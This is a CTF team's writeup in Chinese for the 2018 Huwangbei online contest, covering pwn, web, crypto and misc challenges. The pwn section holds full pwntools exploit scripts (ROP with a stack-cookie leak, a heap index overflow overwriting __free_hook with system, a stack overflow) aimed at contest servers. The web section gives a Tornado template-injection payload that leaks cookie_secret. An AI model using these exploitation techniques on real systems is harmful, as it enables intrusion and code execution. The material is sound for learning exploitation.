---
title: 2018 护网杯线上赛 Writeup-Waterdrop
date: 2018-10-13 23:46:29
tags:
---
WaterDrop 战队2018护网杯线上赛Writeup

<!-- more -->

# pwn
## huwang

这题666那个选项就是我国赛出的题改了下........说好的保护知识产权呢.......
伪条件竞争，可以把`/tmp/secert`清空，然后进去之后就是`rop`

```python
from pwn import *
debug=0
context.log_level='debug'
context.arch='amd64'
e=ELF('./libc-2.23.so')
if debug:

#p=process('./huwang')

    p=process('./huwang',env={'LD_PRELOAD':'./libc-2.23.so'})
    gdb.attach(p)
else:
    p=remote('117.78.26.12', 32307)
def ru(x):
    return p.recvuntil(x)
def se(x):
    p.send(x)
def sl(x):
    p.sendline(x)


if debug:
    w=process('huwang')
else:
    w=remote('117.78.26.12', 32307)

 
w.recvuntil('command>> ')
w.sendline('666')
w.recvuntil('please input your name')
w.send('1'*0x18)
w.recvuntil('Do you want to guess the secret?')
w.sendline('y')
w.recvuntil('Input how many rounds do you want to encrypt the secret:')
w.sendline('-1')

ru('command>> ')
sl('666')
ru('please input your name')
se('1'*0x19)
ru('Do you want to guess the secret?')
sl('y')
ru('Input how many rounds do you want to encrypt the secret:')
sl('1')
ru('Try to guess the md5 of the secret')
se(p64(0xbff94be43613e74a)+p64(0xa51848232e75d279))
ru('1'*0x19)
cookie='\x00'+p.recv(0x7)
ru('What`s your occupation?')
se('1'*255)
ru('Do you want to edit you introduce by yourself[Y/N]')
se('Y\n')

 

puts=0x400AB8
bss=0x603020+0x200
prdi=0x401573
prsi=0x401571
prbp=0x400bb0
leave=0x400d45
mread=0x400CC1
 
payload='a'*0x108+cookie
payload+=flat(bss-0x10,prdi,0x602F70,puts,prdi,bss-8,prsi,0x100,0x100,mread,leave)
 
sleep(0.5)
se(payload)
ru('a'*0x108)
ru('\n')
base=u64(p.recv(6)+'\x00\x00')-e.symbols['puts']
one_gadget=base+0x4526a

se(p64(one_gadget)+'\n')
print(hex(u64(cookie)))
 
p.interactive()
```

## shoppingCart
审计了一下，发现`edit`那里有个下标溢出，可以修改第一个`while`循环创建的那些结构

然后程序保护开得挺全的，那首先要leak出一个地址

`leak`的方法是

1. 创建两个`small bin chunk`
2. 删除第一个，这个时候第一个就进了`unsorted bin`
3. 创建一个`size`为0的`chunk`，实际返回的是大小为0x18的`chunk`，下面是截断的代码，因为read返回的是0，所以把`size`位给置0了，这样就能leak到libc的基址
```c
*((_BYTE *)*v1 + (signed int)read(0, *v1, size) - 1) = 0;
```

第一个循环建立的结构大概如下
```
+--------------------+      +------------------------+          +----------------------+
|                    |      |                        |          |                      |
|        A           +--->  |           B            +------->  |          C           |
|                    |      |                        |          |                      |
+--------------------+      +------------------------+          +----------------------+


     BSS段                            Heap                               BSS段

     index:  -17                                                      index: -37
```
那个index是随便编的，大概理解就行

我们可以修改C的内容，让它指向libc中 `main_arena`那里，为什么要指向那里呢？ 因为那里的基本都是存着自身地址`-0x10`的指针，依靠这个我们就可以达到任意写

```
+---------------------+          +---------------------+         +--------------------+
|                     |          |                     |         |                    |
|          C          | +----->  |        D            | +-----> |         E          |
|                     |          |                     |         |                    |
+---------------------+          +---------------------+         +--------------------+



         BSS段                       Libc+0x10xx00                  Libc+0x10xx00-0x10

         Index: -37

```

怎么达到呢？

首先我们目前可以修改的是E的内容

我们可以再创建F，让它指向E，只要在E处填上我们想控制的地址就行

```
+------------------+         +-----------------+         +-----------------+
|                  |         |                 |         |                 |
|         F        | +-----> |        E        | +---->  |        G        |
|                  |         |                 |         |                 |
+------------------+         +-----------------+         +-----------------+


       Bss段                   Libc+0x10xx00-0x10           被 控 制 的 内 存

       Index:-38

```

最终的payload如下

```python
from pwn import *

debug=0

context.log_level='debug'
e=ELF('./libc-2.23.so')

if debug:
    #p=process('./task_shoppingCart')
    p=process('./task_shoppingCart',env={'LD_PRELOAD':'./libc-2.23.so'})
    gdb.attach(p)
else:
    p=remote('49.4.13.41', 32430)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

for i in range(14):
    ru('EMMmmm, you will be a rich man!')
    sl('1')
    ru('RMB or Dollar?')
    se('2222\n')
sl('3')

def buy(sz,name,s=True):
    sl('1')
    ru('How long is your goods name?')
    sl(str(sz))
    ru('What is your goods name?')
    if s:
        se(name)
    ru('Now, buy buy buy!')


def delete(idx):
    sl('2')
    ru('Which goods that you don\'t need?')
    sl(str(idx))
    ru('Now, buy buy buy!')


def edit(idx,name):
    sl('3')
    ru('Which goods you need to modify?')
    sl(str(idx))
    ru('OK, what would you like to modify ')
    data=ru('to')[:-2]
    se(name)
    ru('Now, buy buy buy!')
    return data

buy(0xa8,'0\n')
buy(0xa8,'/bin/sh\x00\n')
delete(0)
buy(0,'123',False)

libc=u64(edit(2,'123\n')[:6]+'\x00\x00')
base=libc-0x3C4C18
free_hook=base+e.symbols['__free_hook']
system=base+e.symbols['system']

edit(-7,p64(libc))
edit(-27,p64(free_hook))
edit(-8,p64(libc-0x10))
edit(-28,p64(system))

sl('2')
ru('Which goods that you don\'t need?')
sl('1')

p.interactive()
```



## gettingstart
简单栈溢出覆盖变量的值

```python
from pwn import *
import struct
p = remote("49.4.79.81",30538)

payload = "a"*0x18+p64(0x7FFFFFFFFFFFFFFF)+struct.pack('d',0.1)
#payload = p64(0xdeadbeefdeadbeef)*3 + p64(0x7fffffffffffffff)
#payload += p64(0x3fb999999999999a) + p64(0x9e0bd7fc69d6cf00)
p.recv()
p.sendline(payload)

p.interactive()
```

# web
## easy_tornado 

`http://49.4.78.81:30299/error?msg=1`  
存在模板注入   
`http://49.4.78.81:30299/error?msg={{handler.settings}}` 获取 `cookie_secret`   
由提示得 `md5(cookie_secret + md5('/fllllllllllag'))`  
最后将 `filename` 改为 /`fllllllllllag`,签名改为生成的 md5 值即可   

# crypto
## Fez
化简可得 `Result = ini_R ^ K1 ^ K2 ^ k4 ^ K5 + ini_L ^ ini_R ^ K0 ^ K2 ^ K3 ^ K5`
设 `x = K1 ^ K2 ^ k4 ^ K5 ; y = K0 ^ K2 ^ K3 ^ K5`
```py
# -*- coding:utf8 -*-

def xor(a,b):
  assert len(a)==len(b)
  c=""
  for i in range(len(a)):
      c+=chr(ord(a[i])^ord(b[i]))
  return c
test = '0b7361c8143e5935f9f5be3949cc07ed7a5ba6f258ebd91f29c5a7d16976f8dfb7fa422a6167281e573d015cc6d995841d5cab07923c'
fez = 'f46d9ffa6a28a3fc2aa17c244ec29fc6a7bf5cac0da4489ad53782f1ef66597dc2928517b56693347ad468154e6f0f1ff8501fa6a1b1'
result = '44668860d4e23030bd4a0981530bc1d6da1a20f821aa51941258862cfb716cac503d0f0dcec150171aecfe4d86839f346ff26f2a6a70'

test = test.decode('hex')
fez = fez.decode('hex')
result = result.decode('hex')

x = xor(fez[0:27], test[27:54])
y = xor(xor(test[0:27], test[27:54]), fez[27:54])

R = xor(result[0:27], x)
L = xor(xor(result[27:54], R), y)
print L + R

```

# misc
## 迟来的签到题
 根据提示  xor
```py
# -*- coding:utf8 -*-
dic = {}
for i in range(0,26):
  dic[chr(ord('A') + i)] = ord(chr(ord('A') + i)) - ord('A')
  dic[chr(ord('a') + i)] = ord(chr(ord('a') + i)) - ord('a') + 26
for i in range(0,10):
  dic[chr(ord('0') + i)] = ord(chr(ord('0') + i)) - ord('0') + 52
dic['+'] = 62
dic['/'] = 63
dic['='] = 0

s = 'AAoHAR1XICMnIlBfUlRXXyBXJFRSUCRRI1RSJyQkIlYgU1EjURs='
r = ''

for i in range(0, len(s)):
  r += '{:06b}'.format(dic[s[i]])
for j in range(0, 128):
  k = ''
  for i in range(0, int(len(r)/8)):
    t = int(r[i*8:i*8+8], 2)
    p = t ^ j
    k += chr(p)
  if k.find('flag') != -1:
    print(k)
    break
```

